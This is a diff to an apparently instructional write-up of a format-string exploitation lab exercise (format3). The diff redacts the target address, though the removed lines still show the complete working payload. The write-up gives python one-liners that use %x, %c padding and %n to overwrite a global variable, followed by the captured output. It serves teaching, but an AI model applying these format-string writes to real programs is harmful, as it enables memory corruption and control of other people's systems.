@@ -90,14 +90,16 @@ Breakpoint 1, main (argc=0x1, argv=0xffffd5e4) at format3.c:35
 Symbol "target" is static storage at address 0x804a048.
 ```
 
-As we can see, `target` is located at `0x804a048`. So what part of memory is that? A quick look at `info proc map` tells us that this address does not lie in the stack, but the output isn't super helpful otherwise. To answer our question, we need to use another utility: `readelf`. A quick call to `readelf -S format3` will give us all of the sections in our ELF[^1] binary and a quick look will tell us that address `0x804a048` falls into `.bss`. The `.bss` section is a location in memory that holds unitilized data, all of which will be initialized to zeros when the program starts execution. Ah, so we can conclude that our compiler decided that the `.bss` section was to the best place to put the unitialized global variable `target`. In the absence of ASLR, we also suspect that this address will remain the same both inside and outside of gdb.
+**Instructor's Note: I've redacted the address partially (via the "????" string) so that the reader can't just copy the solution string at the bottom.**
+
+As we can see, `target` is located at `0x804????`. So what part of memory is that? A quick look at `info proc map` tells us that this address does not lie in the stack, but the output isn't super helpful otherwise. To answer our question, we need to use another utility: `readelf`. A quick call to `readelf -S format3` will give us all of the sections in our ELF[^1] binary and a quick look will tell us that address `0x804????` falls into `.bss`. The `.bss` section is a location in memory that holds unitilized data, all of which will be initialized to zeros when the program starts execution. Ah, so we can conclude that our compiler decided that the `.bss` section was to the best place to put the unitialized global variable `target`. In the absence of ASLR, we also suspect that this address will remain the same both inside and outside of gdb.
 
 [^1]: [ELF](/papers/elf.pdf) is the file format used by Linux executables.
 
-If we pull this all together, our current exploit string looks like `python -c "print '\x48\xa0\x04\x08'+'%x'*15"` which would stop printing after it prints `804a048`. We need to subtract 1 `%x` and replace it with a `%n` for the value of `target` to get changed, so let's see what happens when we run
+If we pull this all together, our current exploit string looks like `python -c "print '????\x04\x08'+'%x'*15"` which would stop printing after it prints `804????`. We need to subtract 1 `%x` and replace it with a `%n` for the value of `target` to get changed, so let's see what happens when we run
 
 ```bash
-python -c "print '\x48\xa0\x04\x08'+'%x'*14+'%n'" | ./format3
+python -c "print '????\x04\x08'+'%x'*14+'%n'" | ./format3
 
 Hf7fe7e20f7e4cfbb0f7fbf0000ffb6a5b88048527ffb6a36c200f7fbf5c0f7fe480af7ffa000f7debdc8f7fcd580
 target is 00000060 :(
@@ -107,11 +109,11 @@ Great! We are setting values! `target` is now equal to `0x60`. Now we just need 
 
 First let's replace all the `%x` with `%c` to ensure that 1 character is printed out per format string flag. Let's leave the last `%x` to allow us to specify padding and get the exact value we want in `target`. `0x01025544` in decimal is `16930116`. Then we do some subtraction:`16930116 characters needed - 13 %c's - 4 (target address) = 16930099 additional characters to print`.
 
-This yields a format string of `python -c "print '\x48\xa0\x04\x08'+'%c'*13+'%.16930099x'+'%n'"`. Let's run it and see what it 
+This yields a format string of `python -c "print '????\x04\x08'+'%c'*13+'%.16930099x'+'%n'"`. Let's run it and see what it 
 does:
 
 ```bash
-python -c "print '\x48\xa0\x04\x08'+'%c'*13+'%.16930099x'+'%n'" | ./format3
+python -c "print '????\x04\x08'+'%c'*13+'%.16930099x'+'%n'" | ./format3
 
 you have modified the target correctly :)
 flag: hello world!
